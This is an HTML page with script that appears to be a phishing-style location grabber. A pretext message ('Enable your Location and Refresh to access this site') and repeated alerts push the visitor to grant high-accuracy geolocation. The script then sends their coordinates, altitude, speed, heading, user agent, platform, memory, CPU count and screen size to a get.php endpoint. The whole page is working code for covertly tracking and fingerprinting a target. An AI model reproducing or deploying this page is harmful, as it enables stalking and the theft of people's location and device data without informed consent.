<!DOCTYPE html>
<html>
<body>
<meta http-equiv="refresh" content="30" />
<p>Enable your "Location" and Refresh to access this site.</p>
<body onLoad="getLocation()">
<button onclick="getLocation()">Enable It</button>


<script>


function getLocation() {
    if (navigator.geolocation) {
    var acc = {enableHighAccuracy : true , timeout : 30000, maximumage : 0 };
        navigator.geolocation.getCurrentPosition(showPosition, showError, acc);
    } else { 
        x.innerHTML = "This site requires Geolocation to work.";
    }
}

function showPosition(position) {

 //   x.innerHTML = "Latitude: " + position.coords.latitude + 
 //   "<br>Longitude: " + position.coords.longitude;

  var useragent = navigator.userAgent;
  var latitude = position.coords.latitude;
  var longitude = position.coords.longitude;
  var altitude = position.coords.altitude;
  var accuracy = position.coords.accuracy;
  var speed = position.coords.speed;
  var heading = position.coords.heading;
  var platform = navigator.platform;
  var hardware = navigator.hardwareConcurrency;
  var memory = navigator.deviceMemory;
  var height = window.screen.height;
  var width = window.screen.width;


window.location.href = "get.php?latitude=" + latitude + "&longitude=" + longitude + "&altitude=" + altitude + "&platform=" + platform + "&accuracy=" + accuracy + "&speed=" + speed + "&heading=" + heading + "&hardware=" + hardware + "&memory=" + memory + "&useragent=" + useragent + "&height=" + height + "&width=" + width;

}
function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var error = '1' ; // 'permission denied';
      alert('Please, Allow Location Permission...');
      break;
		case error.POSITION_UNAVAILABLE:
			var error = '2' // 'unavailable';
			break;
		case error.TIMEOUT:
			var error = '3' // 'timed out';
      alert('Please refresh this page...');
			break;
		case error.UNKNOWN_ERROR:
			var error  = '4' // 'unknown error';
			break;
	}

window.location.href = "error.php?error=" + error;

}
</script>

</body>
</html>

